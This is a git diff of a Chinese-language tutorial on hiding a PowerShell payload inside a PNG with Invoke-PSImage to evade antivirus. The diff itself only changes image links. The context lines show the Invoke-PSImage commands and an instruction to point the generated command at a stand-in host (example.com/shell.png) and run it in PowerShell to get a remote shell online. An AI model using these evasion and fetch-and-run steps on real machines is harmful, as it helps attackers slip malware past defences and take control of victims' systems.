@@ -25,7 +25,7 @@ Invoke-PSImage可以将一个PowerShell脚本中的字节嵌入到PNG图像文�
 
 payload.ps1
 ### 准备图片
-![](http://cooltige.com/wp-content/uploads/2020/02/19d3f2e1cd905f9b8b037759249ff2ae.png)
+![](img/ps_bypass_av/19d3f2e1cd905f9b8b037759249ff2ae.png)
 
 1.jpg
 
@@ -34,7 +34,7 @@ Invoke-PSImage.ps1
 # 开始实验
 首先将生成的payload.ps1进行在线查杀
 virustotal:`www.virustotal.com`
-![](http://cooltige.com/wp-content/uploads/2020/02/9e700a3d729cd2970c156ecf4acfee77.png)
+![](img/ps_bypass_av/9e700a3d729cd2970c156ecf4acfee77.png)
 
 然后将 payload.ps1 1.jpg Invoke-PSImage.ps1 放在一个文件夹(这里我放在桌面)
 ```
@@ -45,19 +45,19 @@ PS C:\Users\Administrator\Desktop> Import-Module .\Invoke-PSImage.ps1
 PS C:\Users\Administrator\Desktop>Invoke-PSImage -Script .\payload.ps1 -Image .\1.jpg -Out .\shell.png -Web
 ```
 
-![](http://cooltige.com/wp-content/uploads/2020/02/d0d0e0fe549dfd0365fdeaee67498b0c.png)
+![](img/ps_bypass_av/d0d0e0fe549dfd0365fdeaee67498b0c.png)
 
 生成一个shell.png的免杀图片文件
 
 将生成的文件拿去查杀
 
-![](http://cooltige.com/wp-content/uploads/2020/02/f1294cb6d52dfa01aa17020ae9a446d7.png)
+![](img/ps_bypass_av/f1294cb6d52dfa01aa17020ae9a446d7.png)
 
 将生成的命令中的`http://example.com/shell.png`替换为你免杀图片的url，带入powershell中执行
 
-![](http://cooltige.com/wp-content/uploads/2020/02/185f3178d181147b1671c92080b4620d.png)
+![](img/ps_bypass_av/185f3178d181147b1671c92080b4620d.png)
 
-![](http://cooltige.com/wp-content/uploads/2020/02/77af8c88af3f28d846b0dd431174eace.png)
+![](img/ps_bypass_av/77af8c88af3f28d846b0dd431174eace.png)
 
 完成上线
 
